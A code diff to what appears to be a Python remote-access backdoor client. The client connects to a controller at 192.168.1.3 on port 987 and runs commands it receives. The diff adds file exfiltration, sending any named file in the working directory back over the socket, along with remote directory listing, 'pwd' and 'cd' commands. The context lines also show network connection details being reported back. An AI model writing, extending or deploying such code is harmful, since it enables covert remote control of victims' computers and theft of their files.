@@ -4,6 +4,12 @@ import psutil
 import platform
 from socket import *
 
+def sendfile(filename, socket):
+    f = open(str(filename), 'rb')
+    fd = f.read()
+    f.close()
+    socket.send(fd)
+
 s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
 ep = ('192.168.1.3', 987)
 s.connect(ep)
@@ -41,6 +47,23 @@ while str(msg) != 'exit':
                rs.append(str(r.raddr))
             s.send(str(rs).encode('ascii'))
             rs.clear()
+        elif msg.startswith('get'):
+            fn = msg.replace('get ', '')
+            fl = os.listdir(os.getcwd())
+            for f in fl:
+                if fn == f:
+                    sendfile(fn, s)
+                    break
+        elif msg == 'ls':
+            fl = os.listdir(os.getcwd())
+            s.send(str(fl).encode('ascii'))
+        elif msg == 'pwd':
+            r = os.getcwd()
+            s.send(r.encode('ascii'))
+        elif msg.startswith('cd'):
+            fn = msg.replace('cd ', '')
+            os.chdir(fn)
+            s.send(str('file changed !').encode('ascii'))
                 
         message = s.recv(2000)
         msg = bytes(message).decode('ascii')
